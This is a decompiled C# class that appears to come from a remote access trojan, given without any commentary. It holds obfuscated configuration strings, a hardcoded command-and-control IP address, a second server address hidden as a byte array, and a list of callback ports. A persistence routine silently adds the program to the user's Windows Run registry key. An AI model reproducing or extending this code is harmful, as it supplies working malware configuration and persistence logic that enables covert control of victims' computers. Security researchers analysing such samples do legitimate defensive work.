using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace nirtbivaes;

internal static class CEDAZRNF
{
	public static int nirtbivaesport;

	public static string ithgaravaappPath = Application.get_ExecutablePath().ToString();

	public static string nirtbivaespc_id = "whrav|nirtbivaes".Split(new char[1] { '|' })[0];

	public static string nirtbivaesremvUser = "nwtdarnrt|nirtbivaes".Split(new char[1] { '|' })[0];

	public static string nirtbivaesfilesLogs = "arthabla".Split(new char[1] { '|' })[0];

	public static string nirtbivaesAppPath = "";

	public static string nirtbivaesdefaultP = "110.223.225.204|nirtbivaes".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 6658, 4676, 9666, 12824, 16624 };

	public static byte[] nirtbivaesvpsips = new byte[13]
	{
		54, 52, 46, 49, 56, 56, 46, 49, 50, 46,
		49, 50, 54
	};

	public static string nirtbivaesmainApp = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath().ToString());

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string nirtbivaesOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!nirtbivaes".Split(new char[1] { '!' })[0];
		}
	}

	public static void nirtbivaesset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|nirtbivaes".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			object value = registryKey.GetValue(nirtbivaespc_id + app);
			if (value == null || path != value.ToString())
			{
				registryKey.SetValue(nirtbivaespc_id + app, path);
			}
		}
		catch
		{
		}
	}

	public static string nirtbivaesget_mpath()
	{
		return Path.GetDirectoryName(ithgaravaappPath) + "\\";
	}
}
